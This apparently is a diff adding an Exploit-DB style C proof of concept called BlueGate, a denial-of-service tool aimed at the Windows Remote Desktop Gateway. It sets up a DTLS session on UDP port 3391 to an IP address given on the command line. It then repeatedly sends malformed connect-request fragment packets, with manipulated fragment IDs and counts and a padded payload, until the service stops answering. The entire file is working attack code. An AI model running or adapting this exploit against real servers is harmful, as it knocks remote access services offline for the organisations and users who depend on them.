@@ -1,0 +1,135 @@
+#include "BlueGate.h"
+
+/* 
+EDB Note: 
+- Download (Source) ~ 
+- Download (Binary) ~ 
+*/
+
+
+void error(const char* msg)
+{
+	printf("ERROR: %s\n", msg);
+	exit(EXIT_FAILURE);
+}
+
+void SOCKInit()
+{
+	WSADATA wsaData;
+	int res;
+
+	res = WSAStartup(MAKEWORD(2, 2), &wsaData);
+
+	if (res != 0)
+		error("WSAStartup failed");
+}
+
+void DTLSInit()
+{
+	SSL_library_init();
+	SSL_load_error_strings();
+	ERR_load_BIO_strings();
+	OpenSSL_add_all_algorithms();
+}
+
+int OpenUDPConnection(const char* hostname, int port)
+{
+	int sockfd;
+	sockaddr_in addr;
+
+	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+
+	if (sockfd < 0)
+		error("Failed to open socket");
+
+	addr.sin_family = AF_INET;
+	addr.sin_port = htons(port);
+	
+	inet_pton(AF_INET, hostname, &(addr.sin_addr));
+
+	if (connect(sockfd, (struct sockaddr*) & addr, sizeof(addr)) != 0)
+	{
+		closesocket(sockfd);
+		error("Failed to connect socket");
+	}
+
+	return sockfd;
+}
+
+SSL* DTLSConnection(const char* hostname)
+{
+	int sockfd;
+	int result;
+	DTLSParams client;
+	
+	sockfd = OpenUDPConnection(hostname, 3391);
+
+	client.ctx = SSL_CTX_new(DTLS_client_method());
+	client.bio = BIO_new_ssl_connect(client.ctx);
+
+	BIO_set_conn_hostname(client.bio, hostname);
+	BIO_get_ssl(client.bio, &(client.ssl));
+
+	SSL_set_connect_state(client.ssl);
+	SSL_set_mode(client.ssl, SSL_MODE_AUTO_RETRY);
+
+	SSL_set_fd(client.ssl, sockfd);
+
+	if (SSL_connect(client.ssl) != 1) {
+		return NULL;
+	}
+	
+	return client.ssl;
+}
+
+int send_dos_packet(SSL* ssl, int id) {
+	CONNECT_PKT_FRAGMENT packet;
+
+	packet.hdr.pktID = PKT_TYPE_CONNECT_REQ_FRAGMENT;
+	packet.hdr.pktLen = sizeof(CONNECT_PKT_FRAGMENT) - sizeof(UDP_PACKET_HEADER);
+	packet.usFragmentID = id;
+	packet.usNoOfFragments = id;
+	packet.cbFragmentLength = 1000;
+	memset(packet.fragment, 0x41, 1000);
+
+	char pkt[sizeof(packet)];
+	memcpy(&pkt, &packet, sizeof(packet));
+
+	return SSL_write(ssl, pkt, sizeof(pkt));
+}
+
+int main(int argc, char* argv[])
+{
+	
+	SSL* ssl;
+	int i = 0;
+	char* hostname;
+
+	if (argc != 2) {
+		printf("Usage: %s <IP address>\n", argv[0]);
+		return 0;
+	}
+
+	hostname = argv[1];
+
+	SOCKInit();
+	DTLSInit();
+	
+	while (i++ > -1) {
+		ssl = DTLSConnection(hostname);
+
+		if (ssl == NULL) {
+			break;
+		}
+		
+		for (int n = 0; n < 4; n++) {
+			send_dos_packet(ssl, i+n);
+			printf("Sending packet [%u]\n", i + n);
+		}
+
+		i++;
+	}
+
+
+	return 0;
+}
